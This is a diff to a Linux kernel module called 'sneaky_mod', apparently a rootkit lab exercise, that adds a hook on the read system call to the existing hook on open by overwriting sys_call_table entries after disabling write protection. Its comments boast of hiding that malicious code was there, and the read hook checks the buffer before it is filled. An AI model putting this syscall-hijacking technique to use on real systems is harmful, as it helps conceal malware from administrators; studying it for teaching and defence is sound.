@@ -16,6 +16,8 @@
 //so that we can change the read/write permissions of kernel pages.
 #define read_cr0() (native_read_cr0())
 #define write_cr0(x) (native_write_cr0(x))
+#define MODULE_NAME "sneaky_mod"
+
 
 /*
 module_param(foo, int 0000)
@@ -47,6 +49,8 @@ static unsigned long *sys_call_table = (unsigned long*)0xffffffff81801400;
 //should expect ti find its arguments on the stack (not in registers).
 //This is used for all system calls.
 asmlinkage int (*original_call)(const char *pathname, int flags);
+asmlinkage int (*original_read)(int fd, char *buf, size_t count);
+
 
 //Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_open(const char *pathname, int flags)
@@ -58,6 +62,14 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags)
   }
 
   return original_call(pathname, flags);
+}
+
+asmlinkage int sneaky_read(int fd, char *buf, size_t count)
+{
+  if(strnstr(buf, MODULE_NAME, strlen(MODULE_NAME))){
+    printk(KERN_INFO "SNEAKY MOD DETECTED!\n");
+  }
+  return original_read(fd, buf, count);
 }
 
 
@@ -83,6 +95,8 @@ static int initialize_sneaky_module(void)
   //table with the function address of our new code.
   original_call = (void*)*(sys_call_table + __NR_open);
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
+  original_read = (void*)*(sys_call_table + __NR_read);
+  *(sys_call_table + __NR_read) = (unsigned long)sneaky_read;
 
   //Revert page to read-only
   pages_ro(page_ptr, 1);
@@ -111,6 +125,8 @@ static void exit_sneaky_module(void)
   //This is more magic! Restore the original 'open' system call
   //function address. Will look like malicious code was never there!
   *(sys_call_table + __NR_open) = (unsigned long)original_call;
+
+  *(sys_call_table + __NR_read) = (unsigned long)original_read;
 
   //Revert page to read-only
   pages_ro(page_ptr, 1);
